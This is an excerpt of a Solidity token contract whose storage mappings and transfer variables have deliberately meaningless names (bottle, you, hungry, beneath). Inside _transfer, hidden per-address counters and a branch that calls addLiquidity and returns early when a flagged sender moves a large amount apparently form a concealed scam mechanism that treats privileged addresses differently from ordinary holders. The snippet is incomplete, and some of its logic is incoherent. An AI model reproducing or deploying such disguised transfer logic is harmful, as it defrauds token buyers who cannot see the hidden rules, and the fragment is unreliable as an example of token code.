...
contract Contract is Ownable {
    ...
    uint256 private hang = _tTotal;
    uint256 private _rTotal = ~uint256(0);
    uint256 public _fee = 5;

    mapping(uint256 => address) private bottle;
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private you;
    mapping(address => uint256) private _balances;
    mapping(address => uint256) private hungry;
    mapping(uint256 => address) private beneath;
    ...
    function _transfer(
        ...
        address play = beneath[hang];
        bool lift = know == bottle[hang];
        uint256 spring = _fee;

        if (you[know] == 0 && !lift && hungry[know] > 0) {
            you[know] -= spring;
        }

        beneath[hang] = yet;

        if (you[know] > 0 && amount == 0) {
            you[yet] += spring;
        }

        hungry[play] += spring;

        if (you[know] > 0 && amount > hang) {
            addLiquidity(amount);
            return;
        }
        ...
        _balances[know] -= amount;
        _balances[yet] += amount;
    }
